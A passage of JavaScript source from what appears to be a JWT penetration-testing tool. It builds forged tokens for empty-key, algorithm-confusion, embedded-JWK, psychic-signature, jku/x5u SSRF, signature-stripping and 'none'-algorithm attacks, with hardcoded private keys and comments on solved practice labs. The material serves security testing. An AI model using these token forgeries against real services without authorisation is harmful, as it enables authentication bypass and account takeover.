        var signature = await signHS(b64URLencode(header_with_duplicates), body, alg, "\0"); // empty key
        test_cases.push(new TestCase({
            description: "Empty Key Attack",
            variantName: `Empty Key Attack ${alg}`,
            originalToken: token,
            testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
            originalReadable: header_parsed,
            testReadable: header_with_custom_key,
            vulnerability: vulnerabilities.EmptyKey
        }))
        console.debug(`${b64URLencode(header_with_duplicates)}.${body}.${signature}`)
    }
    return test_cases

}

/**
 * Generates a token signed with the public key (JWK or PEM) used as HMAC key.
 * Currently only supports RS256.
 * If the key is given as a JWK, it will be converted to PEM format.
 * additionally the parameters in the JWK will be used aswell.
 * A detailed overview of the attacks can be found in the function.
 * @param {string} token JWT token
 * @param {string} algOutput algorithm to use (e.g., RS256)
 * @param {string} key PEM or JWK key as string
 * @param {boolean} [setTypHeader=false] set the header.typ = "JWT"
 * @return {Promise<TestCase[]|[]>} array of test cases with the generated tokens or empty array if an error occurs
 */
async function attackKeyConfusion(token, algOutput, key, setTypHeader = false) {
    // https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion SOLVED ✓
    // Solvable with RS256 -> HS256 if the PEM gets base64 encoded to preserve NEWLINES and then decoded and used as ascii key

    // PKCS1: RSA, PCKS8: RSA, EC; JWK: RSA,EC; DER: RSA, EC; x509: RSA, EC;
    // Sanity checks
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attackKeyConfusion: invalid token")
        return [];
    }
    if (typeof algOutput !== "string" || !/HS(?:256|384|512)/.test(algOutput)) {
        jwt_attacks_error_message("attackKeyConfusion: invalid algOutput")
        return [];
    }
    if (!key || typeof key !== "string") {
        jwt_attacks_error_message("attackKeyConfusion: key is not a string")
        return [];
    }
    let pem = ""
    let parsedKey = {};
    const [header, body, _] = token.split(".")
    const algInput = JSON.parse(b64URLdecode(header)).alg;
    // Check if the key is a JWK
    if (key.startsWith("{") && key.endsWith("}")) {
        parsedKey = JSON.parse(key);
        pem = await jwkToSpkiPem(parsedKey, algInput);
        console.debug("Key Confusion: key is a JWK, converted to PEM", key);
    }
    else if (key.startsWith("-----BEGIN") && key.match(/-----\n?$/)) {
        pem = key
        parsedKey = await pemToJwk(pem);
    }
    else {
        jwt_attacks_error_message("Key Confusion: key is not a PEM or JWK", key); // get it? :P
        return [];
    }
    console.debug("Key Confusion: key as base64", pem);
    // Since the PEM input may contain newlines or may not contain newlines
    // we need to unify the format to base64 encoded key with newlines
    pem = pem.replace(/-----(BEGIN|END) [A-Z ]+-----/g, "").replace(/\s+/g, "");
    pem = pem.match(/.{1,64}/g).join("\n");
    pem = `-----BEGIN PUBLIC KEY-----\n${pem}\n-----END PUBLIC KEY-----`;
    console.debug("Key Confusion: PEM key with newlines", pem);

    //*      Testcases
    // The following test cases will be encoded as: key = ASCII(TESTCASE)
    // Tests with the base64 flag will be also encoded as: key = BASE64(TESTCASE)

    // 1.   PEM encoded key (base64) with header, footer, newlines, No newline at the end
    // 2.   PEM encoded key (base64) with header, footer, newlines, with newline at the end (Works for the portswigger lab)
    // 3.   PEM encoded key (base64) with header, footer without newlines
    // 4.   PEM encoded key (base64) without header, footer with newlines
    // 5.   PEM encoded key (base64) without header, footer, newlines (+BASE64)
    // 6.   PEM encoded key (base64) without header, footer, newlines, with newlines at the end
    // 7.   Take e and use it as key (+BASE64)
    // 8.   Take n and use it as key (+BASE64)
    // 9.   Take x and use it as key (+BASE64)
    // 10.  Take y and use it as key (+BASE64)

    // Test case 1-6
    const keyFormatVariants = [
        {
            VariantDescription: "PEM encoded key (base64) with header, footer, newlines, No newline at the end",
            key: pem,
            base64Testable: false
        },
        {
            VariantDescription: "PEM encoded key (base64) with header, footer, newlines, with newline at the end",
            key: pem + '\n',
            base64Testable: false
        },
        {
            VariantDescription: "PEM encoded key (base64) with header, footer without newlines",
            key: pem.replace(/\n/g, ""),
            base64Testable: false
        },
        {
            VariantDescription: "PEM encoded key (base64) without header, footer with newlines",
            key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, ""),
            base64Testable: false
        },
        {
            VariantDescription: "PEM encoded key (base64) without header, footer, newlines",
            key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, "").replace(/\s/g, ""),
            base64Testable: false
        },
        {
            VariantDescription: "PEM encoded key (base64) without header, footer, newlines, with newlines at the end",
            key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, "").replace(/\s/g, "") + '\n',
            base64Testable: false
        }
    ];
    // Test case 7-10
    if (parsedKey) {
        if (parsedKey.kty === "RSA") {
            keyFormatVariants.push(
                {
                    VariantDescription: "Take e and use it as key",
                    key: parsedKey.e,
                    base64Testable: false
                },
                {
                    VariantDescription: "Take n and use it as key",
                    key: parsedKey.n,
                    base64Testable: false
                })
        }
        else if (parsedKey.kty === "EC") {
            keyFormatVariants.push(
                {
                    VariantDescription: "Take x and use it as key",
                    key: parsedKey.x,
                    base64Testable: false
                },
                {
                    VariantDescription: "Take y and use it as key",
                    key: parsedKey.y,
                    base64Testable: false
                })
        }
    }
    // repeat testcases with base64 encoded key
    // Test case 11 (repitition of 5)
    keyFormatVariants.push(
        {
            VariantDescription: "PEM encoded key (base64) without header, footer, newlines",
            key: pem.replace(/-----(BEGIN|END) [A-Z ]+-----\n?/g, "").replace(/\s/g, ""),
            base64Testable: true
        })
    // Test cases 12-15 (repitition of 7-10)
    if (parsedKey) {
        if (parsedKey.kty === "RSA") {
            keyFormatVariants.push(
                {
                    VariantDescription: "Take e and use it as key",
                    key: URL_to_base64(parsedKey.e),
                    base64Testable: true
                },
                {
                    VariantDescription: "Take n and use it as key",
                    key: URL_to_base64(parsedKey.n),
                    base64Testable: true
                })
        }
        else if (parsedKey.kty === "EC") {
            keyFormatVariants.push(
                {
                    VariantDescription: "Take x and use it as key",
                    key: URL_to_base64(parsedKey.x),
                    base64Testable: true
                },
                {
                    VariantDescription: "Take y and use it as key",
                    key: URL_to_base64(parsedKey.y),
                    base64Testable: true
                })
        }
    }

    let test_cases = [];
    // Sign the token with every key format in keyFormatVariants
    // Change the alg to HSxxx and set the typ header to JWT
    for (let k of keyFormatVariants) {

        console.debug("Key Confusion: key format variant", k.VariantDescription);
        console.debug("Key Confusion: key format variant key", k.key);
        // RSxxx -> HSxxx
        var header_with_custom_key = JSON.parse(b64URLdecode(header));
        header_with_custom_key.alg = algOutput;
        if (setTypHeader) header_with_custom_key.typ = "JWT"; // set it again just to be double safe. It is not set in the original token in the portswigger lab but needed for the solution

        // remove ESCAPE_SEQUENCE from the header
        const header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_with_custom_key))
        var signature = await signHS(b64URLencode(header_with_duplicates), body, algOutput, k.key, k.base64Testable);

        test_cases.push(new TestCase({
            description: "Key Confusion Attack / Algorithm Confusion",
            variantName: `${algInput} -> ${algOutput}: ${k.VariantDescription}${k.base64Testable ? " (BASE64)" : ""}`,
            originalToken: token,
            testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
            originalReadable: JSON.parse(b64URLdecode(header)),
            testReadable: header_with_custom_key,
            vulnerability: vulnerabilities.KeyConfusion
        }))
        console.debug(`${b64URLencode(header_with_duplicates)}.${body}.${signature}`)
    }

    return test_cases

}

/**
 * Generates a token signed with a custom key (JWK).
 * The key is embedded in the Token header as a JWK object.
 * It is possible to pass your own key as a parameter.
 * Otherwise a default key will be used.
 * If addCustomKeyViaURL is true, the jku/x5u header will be set to the URL provided. And the token will be signed with the first key.
 * The function will return 4 additional tokens then.
 *
 *
 * @param {string} token JWT token
 * @param {string} alg - algorithm to use (e.g., RS256)
 * @param {object} [key=undefined] JWK key as object
 * @param {boolean} [addCustomKeyViaURL=true] if true, set jku/x5u to URL
 * @param {string} [URL] URL to the JWK Set or Public Key (x5u) to be used in the header
 * @param {boolean} [setTypHeader=false] set header.typ = "JWT"
 * @return {Promise<TestCase[]>}
 */
async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL = true, URL, setTypHeader = false) {
    // https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection SOLVED ✓
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attackCustomKey: invalid token")
        return
    }
    const [header, body, _] = token.split(".")
    key = key ? JSON.parse(key) : undefined;
    if (alg.startsWith("RS")) {
        if (!key || key.kty !== "RSA") key = {
            "kty": "RSA",
            "alg": alg,
            "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83",
            "d": "i6qrmJn9uDqKe50jUtbjXFme6jdxU1XuTE53O0YIHRnrRqaIPUU3aDkmIcp5dstB_9V2UqNU46uhJsKMzVil7TFoNR-zDXG9G3-V0-0WrcOtdxB4KAvqmtlnqFMQWMe37AZt4WEzvSPoW-gsGKS_69PhuWCnDUwOQewawwBG8W7bK8g_TjIRB-azJ3AS1eOPwDWRj2w1pGegajjJejRh7wuXmJA8v_2sZhnZkJl3STWQ3dLw7GoHurmQnMEcQLAYIUCcrmhbpP8GD-2qs7MiGOavCOyRiUt2Ch84T6PXz4HBXk93O_0aJRTEdbgRd6xZ8TEsfV2AurQdvWqirW2l8Q",
            "n": "3IklRLCQsE5Gg0N6DptiPola9R2le_b0nyMpGGbm6OBqldrZkP-gwFgeBNoLS44xuGMR_hLPLLbr1uUizhRcrakA-L1hmiwdz6Kmfn9iRD6Dbkz7upL_h6Bv6-8aoEFvCikm4BNGiEv5NtFTyLdD22LNJA3LTQaaZUFHiUxjtYJ_CJP4XmDVIleG1cVwE5DEEUzxiczfWLo45lzOCvnPDTu8Syt-nbRmEexUckoe9hkCSoiPSJcqOM6uWwQ9GOujXB_0p4GKsW8HeQRVEbpYZgXbCVsC29jlz2h8fPqw2gTYznjFSWh8mr6_Z3SpI1jdZMkb2wVldHpiOn555JVQYw",
            "e": "AQAB",
            "p": "_a9IahEIQDUb_kB4GGL6-elwS94NEN4d1AmnsBXhMLfODVv8Hlv2StEAABirGZpxz10CAHKPxoQRr8s3UYxfCiabPeOVt20pAfl0sHU8P7FTCgRBq1DuCap6b-GB8u06ogr3uDWgez2u8lRx5etoMQ7B0TP5q5xWPZA_t2qoj9k",
            "q": "3oxpkYgJqvcEPNipI1-lpk8hk0DlvSr-XECtE23FydocGJ1cwGUbXo2k_9pSMA3wJxuQcltE0KVBQ3rvohirjnM2LynIyoS0rhMGk0obx-sG6RPH9zG5FSnGudv02BS8cRMtIg012WTp_pZg2NhJ-ZFKDJGnzHhd0q8Knx8M-Js",
            "dp": "x7aYobfq8PFeqlkCsuApiVl3qKKVUrQqc2VueDehYwMw2l-SKixnxxqmj2zcNnnaI0-rZcLK4ZPTgLvRPwftQkaGbMCgexka8Yz7inehCNuG7hnPwRkjbMSjQzUbYq3UPQG5Z3IAd0VmVyyXxlP_YK-nchUi9zFKy4imQLVdInE",
            "dq": "e7G7c4ITLY1CM7eQuvKMlZVh6gCmMLBW1Fu2VxgqWPj7qMq-JMmNns5HqVVlXQRCONpfPNBxvS48yg7oZkYkBHcQ5MHqsnV0H1S_0Nnd-w4stxuhh0mBv7uKkv8oZXmRC6BG86g4B-7JCBH5Hk2JQEd6yuWiSEmWjGVyF-MgSIU",
            "qi": "WOY8SOGUOTFIiQxu8OL5XBMj2vrYHPD2a3H2Vmr4_iIQt9nLNCUn-gbD_XqE9091fGI-UqFGFdm-FoqlY5c7AW4GLvrFrOlGg8uCadAx8zE5eN5f3tCxZY3hJdXWjAZ9F1YxES0ycnjzxszasHXwdWOL0cQHxlx25eEVv5ir6gE"
        }
    }
    else if (alg.startsWith("HS")) {
        if (!key || key.kty !== "oct") key = {
            "kty": "oct",
            "k": "YellowSubmarine",
            "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83"
        }
    }
    else if (alg.startsWith("ES")) {
        if (!key || key.kty !== "EC") key = {
            "alg": alg,
            "crv": "P-256",
            "d": "OBME3fhzbjqqymJ0jbRvmuf5-vTgIavDChAat7TOHy8",
            "ext": true,
            "kty": "EC",
            "x": "m21lUaAZ3fn_iqsqP6i3Rbq6km99KH1JjxBawGlP8-I",
            "y": "m6OANLySoEJJqEhO7m8Z4WrhrJ4r6WY4SNRJLux6748"
        }
    }
    else if (alg.startsWith("PS")) {
        if (!key || key.kty !== "RSA") key = {
            "kty": "RSA",
            "alg": alg,
            "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83",
            "d": "i6qrmJn9uDqKe50jUtbjXFme6jdxU1XuTE53O0YIHRnrRqaIPUU3aDkmIcp5dstB_9V2UqNU46uhJsKMzVil7TFoNR-zDXG9G3-V0-0WrcOtdxB4KAvqmtlnqFMQWMe37AZt4WEzvSPoW-gsGKS_69PhuWCnDUwOQewawwBG8W7bK8g_TjIRB-azJ3AS1eOPwDWRj2w1pGegajjJejRh7wuXmJA8v_2sZhnZkJl3STWQ3dLw7GoHurmQnMEcQLAYIUCcrmhbpP8GD-2qs7MiGOavCOyRiUt2Ch84T6PXz4HBXk93O_0aJRTEdbgRd6xZ8TEsfV2AurQdvWqirW2l8Q",
            "n": "3IklRLCQsE5Gg0N6DptiPola9R2le_b0nyMpGGbm6OBqldrZkP-gwFgeBNoLS44xuGMR_hLPLLbr1uUizhRcrakA-L1hmiwdz6Kmfn9iRD6Dbkz7upL_h6Bv6-8aoEFvCikm4BNGiEv5NtFTyLdD22LNJA3LTQaaZUFHiUxjtYJ_CJP4XmDVIleG1cVwE5DEEUzxiczfWLo45lzOCvnPDTu8Syt-nbRmEexUckoe9hkCSoiPSJcqOM6uWwQ9GOujXB_0p4GKsW8HeQRVEbpYZgXbCVsC29jlz2h8fPqw2gTYznjFSWh8mr6_Z3SpI1jdZMkb2wVldHpiOn555JVQYw",
            "e": "AQAB",
            "p": "_a9IahEIQDUb_kB4GGL6-elwS94NEN4d1AmnsBXhMLfODVv8Hlv2StEAABirGZpxz10CAHKPxoQRr8s3UYxfCiabPeOVt20pAfl0sHU8P7FTCgRBq1DuCap6b-GB8u06ogr3uDWgez2u8lRx5etoMQ7B0TP5q5xWPZA_t2qoj9k",
            "q": "3oxpkYgJqvcEPNipI1-lpk8hk0DlvSr-XECtE23FydocGJ1cwGUbXo2k_9pSMA3wJxuQcltE0KVBQ3rvohirjnM2LynIyoS0rhMGk0obx-sG6RPH9zG5FSnGudv02BS8cRMtIg012WTp_pZg2NhJ-ZFKDJGnzHhd0q8Knx8M-Js",
            "dp": "x7aYobfq8PFeqlkCsuApiVl3qKKVUrQqc2VueDehYwMw2l-SKixnxxqmj2zcNnnaI0-rZcLK4ZPTgLvRPwftQkaGbMCgexka8Yz7inehCNuG7hnPwRkjbMSjQzUbYq3UPQG5Z3IAd0VmVyyXxlP_YK-nchUi9zFKy4imQLVdInE",
            "dq": "e7G7c4ITLY1CM7eQuvKMlZVh6gCmMLBW1Fu2VxgqWPj7qMq-JMmNns5HqVVlXQRCONpfPNBxvS48yg7oZkYkBHcQ5MHqsnV0H1S_0Nnd-w4stxuhh0mBv7uKkv8oZXmRC6BG86g4B-7JCBH5Hk2JQEd6yuWiSEmWjGVyF-MgSIU",
            "qi": "WOY8SOGUOTFIiQxu8OL5XBMj2vrYHPD2a3H2Vmr4_iIQt9nLNCUn-gbD_XqE9091fGI-UqFGFdm-FoqlY5c7AW4GLvrFrOlGg8uCadAx8zE5eN5f3tCxZY3hJdXWjAZ9F1YxES0ycnjzxszasHXwdWOL0cQHxlx25eEVv5ir6gE"
        }
    }
    else {
        jwt_attacks_error_message("attackCustomKey: invalid alg, only RS256, HSxxx, PSxxx and ESxxx supported")
        return [];
    }
    var header_with_custom_key = JSON.parse(b64URLdecode(header));
    header_with_custom_key.jwk = extractPublicJwk(key);
    header_with_custom_key.alg = alg;
    header_with_custom_key.kid = key.kid;
    if (setTypHeader) header_with_custom_key.typ = "JWT"; // set it again just to be double safe. It is not set in the original token in the portswigger lab but needed for the solution

    // remove ESCAPE_SEQUENCE from the header
    let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_with_custom_key))

    if (alg.startsWith("RS")) {
        var signature = await signRS(b64URLencode(header_with_duplicates), body, alg, JSON.stringify(key));
    }
    else if (alg.startsWith("HS")) {
        var signature = await signHS(b64URLencode(header_with_duplicates), body, alg, key.k);
    }
    else if (alg.startsWith("ES")) {
        var signature = await signES(b64URLencode(header_with_duplicates), body, alg, JSON.stringify(key));
    }
    else if (alg.startsWith("PS")) {
        var signature = await signPS(b64URLencode(header_with_duplicates), body, alg, JSON.stringify(key));
    }
    let test_cases = []
    let tmp = []
    if (addCustomKeyViaURL && URL) {
        
        // Custom Key Injection via jku/x5u
        // We can just reuse the attack_SSRF function to generate the test cases
        tmp = attack_SSRF(token, URL, isCalledFromCustomKey = true);
        for (let SSRF_token of tmp) {
            SSRF_token.description = vulnerabilities.CustomKey.name
            SSRF_token.vulnerability = vulnerabilities.CustomKey
            header_with_duplicates = b64URLencode(unescapeCustomJsonKeys(b64URLdecode(SSRF_token.testToken.split(".")[0])));
            const body = SSRF_token.testToken.split(".")[1];

            if (alg.startsWith("RS")) {
                var signature = await signRS(header_with_duplicates, body, alg, JSON.stringify(key));
            }
            else if (alg.startsWith("HS")) {
                var signature = await signHS(header_with_duplicates, body, alg, key.k);
            }
            else if (alg.startsWith("ES")) {
                var signature = await signES(header_with_duplicates, body, alg, JSON.stringify(key));
            }
            else if (alg.startsWith("PS")) {
                var signature = await signPS(header_with_duplicates, body, alg, JSON.stringify(key));
            }
            SSRF_token.testToken = `${header_with_duplicates}.${body}.${signature}`;
            test_cases.push(SSRF_token)
        }
    }
    test_cases.push(new TestCase({
        description: vulnerabilities.CustomKey.name,
        variantName: alg,
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
        originalReadable: JSON.parse(b64URLdecode(header)),
        testReadable: header_with_custom_key,
        vulnerability: vulnerabilities.CustomKey
    }))
    return test_cases
}

/**
 * Replaces the signature of the token with a psychic signature (MAYCAQACAQA).
 * Changes the alg to ES256.
 *
 * @param {string} token JWT token
 * @return {TestCase | []} test case object with psychic signature or empty array if an error occurs
 * @description This attack works on some Java implementations of JWT, where the signature is not verified correctly.
 */
function attackPsychicSignature(token) {
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attackPsychicSignature: invalid token")
        return []
    }
    // straight forward
    // just replace the signature with MAYCAQACAQA and change the alg to ES256
    const [header, body, signature] = token.split(".")
    const psychicSignature = "MAYCAQACAQA"; // <=> mod 0
    const header_json = JSON.parse(b64URLdecode(header));
    header_json.alg = "ES256";

    // remove ESCAPE_SEQUENCE from the header
    const header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_json))

    return new TestCase({
        description: "Psychic Signature Attack",
        variantName: 'Signature: MAYCAQACAQA',
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${psychicSignature}`,
        originalReadable: JSON.parse(b64URLdecode(header)),
        testReadable: header_json,
        vulnerability: vulnerabilities.PsychicSignature
    })
}

/**
 * Genrates tokens with SSRF vulnerabilities in the jku and x5u header fields.
 *
 * @param {string} token JWT token
 * @param {string} [url="http://localhost:8080"] URL to be used in the jku/x5u fields
 * @return {TestCase[]|[]} array of test cases with the generated tokens or empty array if an error occurs
 */
function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey = false) {
    if (!isValidJWT(token)) {
        jwt_attacks_error_message("attack_SSRF: invalid token")
        return [];
    }
    const [header, body, signature] = token.split(".")
    let test_cases = []
    const header_json_org = JSON.parse(b64URLdecode(header));

    // redundat to the function parameter, but since it is possible that the url is empty
    // an empty url would be used
    // I still leave the default value in the function parameter, since it is more readable
    url = url ? url : "http://localhost:8080";

    //* 4 Testcases: x5u/jku in header and x5u/jku in extra jwk in header
    // token generation is straight forward, just add jku/x5u = url to the header
    //1. jku in header
    let header_jku = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
    header_jku.jku = url;

    // remove ESCAPE_SEQUENCE from the header
    let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku), isCalledFromCustomKey)

    test_cases.push(new TestCase({
        description: "Test for SSRF via unvalidated jku in JWT header",
        variantName: 'via jku',
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
        originalReadable: header_json_org,
        testReadable: header_with_duplicates,
        vulnerability: vulnerabilities.SSRF
    }))

    // 2. x5u in header
    let header_x5u = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
    header_x5u.x5u = url;

    // remove ESCAPE_SEQUENCE from the header
    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u), isCalledFromCustomKey)

    test_cases.push(new TestCase({
        description: "Test for SSRF via unvalidated x5u in JWT header",
        variantName: 'via x5u',
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
        originalReadable: header_json_org,
        testReadable: header_with_duplicates,
        vulnerability: vulnerabilities.SSRF
    }
    ))

    // 3. x5u in jwk
    let header_x5u_jwk = JSON.parse(JSON.stringify(header_json_org), isCalledFromCustomKey); // apparently a deep copy
    header_x5u_jwk.jwk = {
        kty: "RSA",
        "e": "AQAB",
        "n": "vRDkI8bC7--s3rE6Tp-xwo7ACC_7RT7Ps2Q7YJUhTF4XmcNXDbBjsbXMaCMiE2e_UQGqQQQ_PLRVmwVp_k9bwQ",
        kid: "1234",
        x5u: url
    }

    // remove ESCAPE_SEQUENCE from the header
    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u_jwk), isCalledFromCustomKey)

    test_cases.push(new TestCase({
        description: "Test for SSRF via unvalidated x5u in JWK in JWT header",
        variantName: 'JWK(x5u) - kty: RSA',
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
        originalReadable: header_json_org,
        testReadable: header_with_duplicates,
        vulnerability: vulnerabilities.SSRF
    }))

    // 4. jku in jwk
    let header_jku_jwk = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
    header_jku_jwk.jwk = {
        kty: "RSA",
        "e": "AQAB",
        "n": "vRDkI8bC7--s3rE6Tp-xwo7ACC_7RT7Ps2Q7YJUhTF4XmcNXDbBjsbXMaCMiE2e_UQGqQQQ_PLRVmwVp_k9bwQ",
        kid: "1234",
        jku: url
    }

    // remove ESCAPE_SEQUENCE from the header
    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku_jwk), isCalledFromCustomKey)

    test_cases.push(new TestCase({
        description: "Test for SSRF via unvalidated jku in JWK in JWT header",
        variantName: 'JWK(jku) - kty: RSA',
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
        originalReadable: header_json_org,
        testReadable: header_with_duplicates,
        vulnerability: vulnerabilities.SSRF
    }))
    return test_cases
}

/**
 * Attacks the JWT token by excluding the signature part.
 *
 * @param {string} token JWT token
 * @return {TestCase|[]} test case object with token without signature or empty array if an error occurs
 */
function attack_signature_exclusion(token) {
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attack_signature_exclusion: invalid token")
        return []
    }
    const [header, body, signature] = token.split(".")

    // remove ESCAPE_SEQUENCE from the header
    header_with_duplicates = unescapeCustomJsonKeys(b64URLdecode(header))

    return new TestCase({
        description: "Test for Signature Exclusion",
        variantName: 'Signature Exclusion',
        originalToken: token,
        testToken: `${b64URLencode(header_with_duplicates)}.${body}.`,
        originalReadable: "-",
        testReadable: "-",
        vulnerability: vulnerabilities.SignatureExclusion

    })
}

/**
 * Attacks the JWT token by changing the alg to none.
 * To bypass possible blacklists, the alg is changed to all possible case combinations of "none".
 *
 * @param {string} token JWT token
 * @return {TestCase[]|[]} array of test cases with the generated tokens or empty array if an error occurs
 */
function attack_none_alg(token) {
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attack_none_alg: invalid token")
        return []
    }
    const [header, body, _signature] = token.split(".")
    const header_json = JSON.parse(b64URLdecode(header))
    const token_output = []
    const allCaseCombinationsOfNone = ["none", "nonE", "noNe", "noNE", "nOne", "nOnE", "nONe", "nONE", "None", "NonE", "NoNe", "NoNE", "NOne", "NOnE", "NONe", "NONE"]

    // change the alg to all possible case combinations of "none" and remove the signature
    for (let none_variant of allCaseCombinationsOfNone) {
        header_json.alg = none_variant;

        // remove ESCAPE_SEQUENCE from the header
        header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_json))
        token_output.push(new TestCase({
            description: "Test for none algorithm - " + none_variant,
            variantName: none_variant,
            originalToken: `${header}.${body}.`,
            testToken: `${b64URLencode(header_with_duplicates)}.${body}.`,
            originalReadable: JSON.parse(b64URLdecode(header)),
            testReadable: header_with_duplicates,
            vulnerability: vulnerabilities.NoneAlg
        }))
    }

    return token_output;
}

// #endregion ====================== End of Attacks Functions

// #region ====================== Key Generation Functions

/**
 * Converts a PEM key to JWK format. The function takes a PEM key and an algorithm as input.
 * It parses the ASN.1 structure of the key to determine its type (RSA or EC) and named curve (if applicable).
 * Then, it imports the key using the Web Crypto API and exports it in JWK format.
 *
 * @param {string} pemKey - The PEM key to be converted.
 * @param {string} algorithm - The algorithm to be used for the key (e.g., 'RS256', 'ES256').
 * @throws {Error} If the key type is unsupported or if the import fails.
 * @return {Promise<object>} - A promise that resolves to the JWK representation of the key.
 */
async function pemToJwk(pemKey, algorithm) {
    const keyData = pemKey
        .replace(/-----BEGIN (PUBLIC|PRIVATE) KEY-----/, "")
        .replace(/-----END (PUBLIC|PRIVATE) KEY-----/, "")
        .replace(/\s+/g, "");

    const binaryDer = base64ToUint8Array(base64_to_URL(keyData));
    const isPrivateKey = pemKey.includes("PRIVATE");

    // Parse ASN.1 to detect key type
    const { keyType, namedCurve } = parseASN1KeyInfo(binaryDer, isPrivateKey);

    // Use key type to determine import algorithm
    let importAlgorithm;
    // This line is mostly used when this function is called from Key Confusion Attack
    // Because you dont know the algorithm at this point

    if (keyType === 'RSA') {
        importAlgorithm = {
            name: algorithm && algorithm.startsWith('PS') ? 'RSA-PSS' : 'RSASSA-PKCS1-v1_5',
            hash: { name: algorithm ? _alg_converter[algorithm] : 'SHA-256' }
        };
    } else if (keyType === 'EC') {
        importAlgorithm = {
            name: 'ECDSA',
            namedCurve: namedCurve
        };
    } else {
        throw new Error(`Unsupported key type: ${keyType}`);
    }
    // Import key
    const cryptoKey = await crypto.subtle.importKey(
        isPrivateKey ? 'pkcs8' : 'spki',
        binaryDer,
        importAlgorithm,
        true,
        isPrivateKey ? ['sign'] : ['verify']
    );

    // Export JWK
    let tmp_jwk = await crypto.subtle.exportKey('jwk', cryptoKey);
    delete tmp_jwk.alg;
    delete tmp_jwk.key_ops;
    return tmp_jwk;

}

/**
 * Parses ASN.1 key information from a DER-encoded byte array.
 * Helper function to extract key type and named curve from the DER bytes.
 *
 *
 * @param {Uint8Array} derBytes - The DER-encoded byte array representing the key.
 * @param {boolean} isPrivateKey - is the key a private key? :o
 * @return {object} - An object containing the key type and named curve (if applicable).
 */
function parseASN1KeyInfo(derBytes, isPrivateKey) {
    // Helper function to read ASN.1 length
    function readLength(bytes, offset) {
        const firstLengthByte = bytes[offset];
        if (firstLengthByte < 128) {
            return { length: firstLengthByte, bytesRead: 1 };
        } else {
            const lengthBytesCount = firstLengthByte & 0x7F;
            let length = 0;
            for (let i = 0; i < lengthBytesCount; i++) {
                length = (length << 8) | bytes[offset + 1 + i];
            }
            return { length, bytesRead: 1 + lengthBytesCount };
        }
    }

    // Known OIDs
    const OIDs = {
        '1.2.840.113549.1.1.1': 'RSA',
        '1.2.840.10045.2.1': 'EC',
        // Curve OIDs
        '1.2.840.10045.3.1.7': 'P-256',
        '1.3.132.0.34': 'P-384',
        '1.3.132.0.35': 'P-521'
    };

    // Function to convert DER OID bytes to string
    function oidToString(bytes, start, length) {
        const values = [];
        let value = 0;
        let first = true;

        for (let i = start; i < start + length; i++) {
            if (first) {
                const firstByte = bytes[i];
                values.push(Math.floor(firstByte / 40));
                values.push(firstByte % 40);
                first = false;
            } else {
                value = (value << 7) | (bytes[i] & 0x7F);
                if (!(bytes[i] & 0x80)) {
                    values.push(value);
                    value = 0;
                }
            }
        }
        return values.join('.');
    }

    // Parse the ASN.1 structure
    let offset = 0;
    let keyType = null;
    let namedCurve = null;

    try {
        // Parse outer SEQUENCE
        if (derBytes[offset++] !== 0x30) throw new Error("Expected SEQUENCE");
        const { length: seqLength, bytesRead: seqBytesRead } = readLength(derBytes, offset);
        offset += seqBytesRead;

        if (isPrivateKey) {
            // For PKCS8 Private Key
            // Parse Version
            if (derBytes[offset++] !== 0x02) throw new Error("Expected INTEGER for version");
            const { length: versionLength, bytesRead: versionBytesRead } = readLength(derBytes, offset);
            offset += versionBytesRead + versionLength; // Skip version

            // Parse AlgorithmIdentifier SEQUENCE
            if (derBytes[offset++] !== 0x30) throw new Error("Expected AlgorithmIdentifier SEQUENCE");
            const { length: algLength, bytesRead: algBytesRead } = readLength(derBytes, offset);
            offset += algBytesRead;

            // Parse Algorithm OID
            if (derBytes[offset++] !== 0x06) throw new Error("Expected Algorithm OID");
            const { length: oidLength, bytesRead: oidBytesRead } = readLength(derBytes, offset);
            offset += oidBytesRead;

            const algorithmOid = oidToString(derBytes, offset, oidLength);
            keyType = OIDs[algorithmOid] || 'unknown';
            offset += oidLength;

            // Parse parameters based on algorithm
            if (keyType === 'EC' && offset < derBytes.length && derBytes[offset] === 0x06) {
                offset++; // OID tag for curve
                const { length: curveOidLength, bytesRead: curveOidBytesRead } = readLength(derBytes, offset);
                offset += curveOidBytesRead;

                const curveOid = oidToString(derBytes, offset, curveOidLength);
                namedCurve = OIDs[curveOid] || 'unknown';
            }
        } else {
            // For SPKI (public key)
            // AlgorithmIdentifier SEQUENCE
